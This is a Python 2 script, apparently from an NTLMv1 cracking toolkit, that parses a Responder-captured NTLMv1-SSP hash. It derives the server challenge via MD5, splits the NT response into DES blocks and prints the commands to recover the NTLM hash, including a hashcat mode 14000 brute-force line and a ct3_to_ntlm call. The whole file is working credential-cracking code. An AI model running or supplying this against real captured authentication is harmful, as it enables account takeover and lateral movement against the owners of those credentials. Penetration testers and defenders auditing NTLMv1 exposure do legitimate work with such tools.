import hashlib,binascii
import argparse
import binascii
import hashlib
import sys

parser = argparse.ArgumentParser()
parser.add_argument('--ssp', help='NTLMv1-SSP Hash in responder format', required=True)
args = parser.parse_args()

hashsplit = args.ssp.split(':')
srvchallenge = hashsplit[5]
ntresp = hashsplit[4]
ct3 = ntresp[32:48]
lmresp = hashsplit[3]

if lmresp[16:48] != "00000000000000000000000000000000":
  print "Hash response is not SSP, use ntlmv1.py --nossp instead"
  sys.exit()


clientchallenge = hashsplit[5]
combinedchallenge = srvchallenge + lmresp[0:16]
m = hashlib.md5()
m.update(binascii.unhexlify(combinedchallenge))
md5hash = m.hexdigest()
srvchallenge = md5hash[0:16]
ct1 = ntresp[0:16]
ct2 = ntresp[16:32]

#Hashfield Split:
#['u4-netntlm', '', 'kNS', '338d08f8e26de93300000000000000000000000000000000', '9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41', 'cb8086049ec4736c']

print "Hashfield Split:"
print str(hashsplit) + "\n"

print "Hostname: " + hashsplit[2]
print "Username: " + hashsplit[0]
print "LM Response: " + lmresp
print "NT Response: " + ntresp
print "Client Challenge: " + clientchallenge
print "SRV Challenge: " + srvchallenge + "\n"

print "To Calculate final 4 characters of NTLM hash use:"
print "./ct3_to_ntlm.bin " + ct3 + " " + clientchallenge + " " + lmresp + "\n"
#./ct3_to_ntlm.bin 2e1e4bf33006ba41 cb8086049ec4736c 338d08f8e26de93300000000000000000000000000000000

print "To crack with hashcat create a file with the following contents:"
print ct1 + ":" + srvchallenge
print ct2 + ":" + srvchallenge + "\n"

print "To crack with hashcat:"
print "./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1"

